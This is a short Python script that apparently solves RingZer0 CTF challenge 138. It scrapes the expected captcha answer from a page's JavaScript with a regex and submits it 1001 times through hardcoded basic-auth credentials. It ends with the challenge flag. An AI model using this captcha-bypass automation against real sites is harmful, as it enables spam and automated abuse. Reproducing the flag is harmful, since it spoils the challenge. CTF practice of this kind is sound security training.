#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests, time, re, os, sys, lxml.html
from requests.auth import HTTPBasicAuth

def ch138():
	ek = 'RZ_CH138_PW'

	s = requests.Session()
	auth = HTTPBasicAuth('captcha', 'QJc9U6wxD4SFT0u')
	url = 'http://captcha.ringzer0team.com:7421'
	for _ in xrange(1001):
		time.sleep(0.10)
		r = s.get('{0}/form1.php'.format(url), auth=auth)
		m = re.search(r'if \(A == "([a-z0-9]*)"\)', r.text)
		captcha = m.group(1)
		r = s.get('{0}/captcha/captchabroken.php?new'.format(url), auth=auth)
		payload = {'captcha':captcha}
		r = s.post('{0}/captcha1.php'.format(url), auth=auth, data=payload)
		doc = lxml.html.document_fromstring(r.text)
		alert = doc.xpath('//div[contains(@class, "alert")]')[0]
		msg = alert.text_content().strip()
		print msg

if __name__ == '__main__':
	ch138()


"""
flag:
9bc635d4385e8a1775ad98980f44eb7d1714f69b
"""
